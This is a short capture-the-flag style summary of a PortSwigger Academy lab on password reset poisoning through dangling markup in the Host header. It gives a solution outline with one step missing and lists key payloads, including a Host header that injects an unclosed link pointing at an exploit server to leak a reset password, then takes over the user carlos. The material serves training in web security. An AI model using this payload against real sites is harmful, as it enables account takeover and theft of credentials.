# Lab: Password reset poisoning via dangling markup

**Official lab:** [Password reset poisoning via dangling markup](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup)

**Lab idea:** This challenge combines password-reset processing with unsafe handling of host-related input in email content and a raw-HTML viewing context. It practices recognizing how malformed or insufficiently escaped markup can expose sensitive information in account-recovery messages.

## Vulnerability in brief
HTTP Host header attacks exploit unsafe handling of the `Host` request header, which identifies the domain or virtual host a client intends to reach. Servers, reverse proxies, load balancers, and applications may rely on this value to route requests or build absolute URLs. When components trust an attacker-controlled value without consistent validation or escaping, the header can influence behavior beyond selecting a site. This topic is a vulnerability class, not a general testing category.

## Solution idea
1. Go to the login page and request a password reset for your own account.
2. Go to the exploit server and open the email client to find the password reset email.
3. In the proxy history, study the response to the GET /email request.
4. In the email client, notice that you have the option to view each email as raw HTML instead.
- …
6. Check the email client.
7. In Burp Repeater, send the request one last time, but change the username parameter to carlos .
8. Log in as carlos using this new password to solve the lab.

## Payloads / key values
- `GET /email`
- `DOMPurify`
- `POST /forgot-password`
- `Host: YOUR-LAB-ID.web-security-academy.net:arbitraryport`
- `Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?`
- `GET /?/login'>[…]`
- `username`
- `carlos`

## Official source
- [PortSwigger Academy: Lab: Password reset poisoning via dangling markup](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-password-reset-poisoning-via-dangling-markup)
